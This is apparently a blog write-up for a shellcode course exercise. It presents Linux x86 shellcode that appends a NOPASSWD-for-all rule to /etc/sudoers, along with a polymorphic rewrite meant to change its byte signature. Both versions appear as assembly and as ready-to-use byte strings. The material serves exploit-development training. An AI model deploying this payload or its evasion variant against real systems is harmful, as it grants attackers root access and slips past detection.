---
layout: post
title: SLAE Exercise 6 - Polymorphic Shellcode Part 2 Sudoers
subtitle: Polymorphic Shellcode Part 2
tags: [SLAE]
---

Overview
======

The first chosen shellcode from shell-storm is the 'sudoers' shellcode. This can be found [here](http://shell-storm.org/shellcode/files/shellcode-62.php). This shellcode writes 'ALL ALL=(ALL) NOPASSWD: ALL\n' to the '/etc/sudoers' file.

The original code can be seen fully commented below:


```
global _start			

section .text
_start:


;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax	; clearing eax register
	push eax	; pushing 0 to the stack
	push 0x7372656f ; pushing /etc/sudoers
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp	; moving stack pointer to ebx
	mov cx, 0x401	; moving 1025 to ecx 
	mov al, 0x05	; moving 5 to eax for the open syscall
	int 0x80	; interupt to call syscall

	mov ebx, eax    ; move the returned fd into ebx

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax	; clear eax register again
	push eax	; push 0 to the stack
	push 0x0a4c4c41	; pushing ALL ALL=(ALL) NOPASSWD: ALL\n
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp	; moving stack pointer to ecx
	mov dl, 0x1c	; moving 28 to edx for the length
	mov al, 0x04	; moving 4 to eax for the write syscall
	int 0x80	; interupt to call syscall

	;close(file)
	mov al, 0x06	; move 6 to eax
	int 0x80	; interupt to call syscall

	;exit(0);
	xor ebx, ebx	; clear ebx register
	mov al, 0x01	; mov 1 to eax
	int 0x80	;interupt to call syscall
```

Using various techniques, this code was altered to create a polymorphic version of it. This code can be seen below:

```
global _start			

section .text
_start:


;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor edx, edx
	mul edx
	push edx
	
	mov ebx, 0x7372656f 
	push ebx
	mov ebx, 0x6475732f
	push ebx
	mov ebx, 0x6374652f
	push ebx
	mov ebx, esp
	mov cx, 0x401
	add al, 0x05
	int 0x80

	xchg ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	mul edx
	push edx
	push 0x0a4c4c41
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
	add dl, 0x1c
	add al, 0x04
	int 0x80

	;close(file)
	mov al, 0x06
	int 0x80

	;exit(0);
	xor ebx, ebx
	mul ebx
	inc eax
	int 0x80
```

It can be clearly seen that the 'sudoers' section of the code is completely different from before, whilst maintaining a relatively small size. 

With this shellcode, it was a bit more difficult to rewrite it as was done with the first shellcode, so other techniques were used to make this code polymorphic. Due to this however, the codes size has increased. Different techniques were used to change this shellcode, including changing what registers were used, pushing data to the stack using registers and clearing registers differently. 


When compiled and the extracted, the shellcode appears as follows:

**Original**

```
"\x31\xc0\x50\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\xb2\x1c\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80"
```

**Polymorphic**

```
"\x31\xd2\xf7\xe2\x52\xbb\x6f\x65\x72\x73\x53\xbb\x2f\x73\x75\x64\x53\xbb\x2f\x65\x74\x63\x53\x89\xe3\x66\xb9\x01\x04\x04\x05\xcd\x80\x93\xf7\xe2\x52\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\x80\xc2\x1c\x04\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xf7\xe3\x40\xcd\x80"
```

As can be seen, the polymorphic shellcode greatly varies from the original and is less than 150% of the size of the original. 

